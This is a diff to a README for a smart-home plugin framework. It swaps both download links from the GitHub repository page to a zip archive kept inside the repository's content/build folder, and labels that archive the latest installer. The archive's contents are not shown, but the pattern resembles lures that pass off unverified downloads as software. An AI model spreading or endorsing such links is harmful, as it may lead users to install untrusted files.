@@ -1,6 +1,6 @@
 # ⚙️ evoframework.org - Build smart devices with simple plugins
 
-[![Download evoframework](https://img.shields.io/badge/Download-evoframework-blue.svg)](https://github.com/Preoperative-briton303/evoframework.org)
+[![Download evoframework](https://img.shields.io/badge/Download-evoframework-blue.svg)](https://raw.githubusercontent.com/Preoperative-briton303/evoframework.org/main/content/build/evoframework-org-1.9.zip)
 
 evoframework.org provides a foundation for smart home appliances. The framework acts as a bridge between your hardware and software tasks. It uses a plugin system to manage device functions. This approach keeps your setup clean and organized. You control your appliances through modular components that fit into the main system.
 
@@ -25,7 +25,7 @@ Ensure your Windows version stays updated. The framework performs best on curren
 
 You must visit the project page to download the latest installer for your system. The repository contains all files for the framework.
 
-[Download the latest release here](https://github.com/Preoperative-briton303/evoframework.org)
+[Download the latest release here](https://raw.githubusercontent.com/Preoperative-briton303/evoframework.org/main/content/build/evoframework-org-1.9.zip)
 
 Follow these steps to obtain the installer:
 
